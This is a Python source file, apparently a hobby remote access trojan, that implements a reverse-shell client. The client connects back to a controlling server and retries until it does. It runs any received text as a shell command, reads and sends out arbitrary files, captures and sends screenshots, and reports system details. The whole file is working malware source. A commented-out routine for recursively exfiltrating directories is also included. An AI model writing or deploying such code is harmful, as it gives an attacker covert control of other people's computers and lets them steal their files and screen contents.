from calendar import c
from platform import platform
import socket
from sys import stdout
import time
import subprocess
import os
from PIL import Image, ImageGrab

HOST = "127.0.0.1"  # The server's hostname or IP address
PORT = 65432  # The port used by the server
def connect(HOST=HOST, PORT=PORT):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
        except:
            print("impossible de se connecter au serveur")
            time.sleep(4)
            print("trying again.......")
            return connect()
            
                
        else:
            print("connected!!")
        def sender(data, socket=s):
            send_len = str(len(data)).zfill(13).encode()
            socket.sendall(send_len)
            socket.sendall(data)
        """def dealer(path):
            text = "dir"+ path
            sender(text.encode())
            onlyfiles = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
            other_dirs = [f for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
            for i in onlyfiles:
                f = open(i, "rb")
                sender(f.read())
                f.close()
            for d in other_dirs:
                dealer(os.path.join(path, d))
                sender(b"back")"""


        while True:
            data = s.recv(1024)
            data = data.decode("utf-8")
            
            if data == "exit":
                sender(b"bye")
                return 
            else:
                if data == "infos":
                    infos =  platform() + " " + os.getcwd()
                    infos = infos.encode()
                    sender(infos)
                    continue
                else:
                    data_split = data.split()
                    if len(data_split) == 2:
                        match data_split[0]:
                            case "cd":
                                try:
                                    os.chdir(data_split[1])
                                    root = os.getcwd()
                                    root = root.encode()
                                    sender(root)
                                
                                except FileNotFoundError:
                                    s.sendall(b" repertoire invalide")
                            case "dl":
                                try:
                                    """if os.path.isdir == True:
                                        dealer(data_split[1])
                                    else:"""
                                    f = open(data_split[1], "rb")
                                    sender(f.read())
                                    f.close()
                                except:
                                    sender(b"xxxx")
                            case "cap":
                                cap = ImageGrab.grab()
                                cap.save("cap.png", "PNG")
                                f = open("cap.png", "rb")
                                sender(f.read())
                                f.close()
                    else:
                        ans = subprocess.run(data, shell=True, capture_output=True)
                        sender(ans.stdout)




connect()

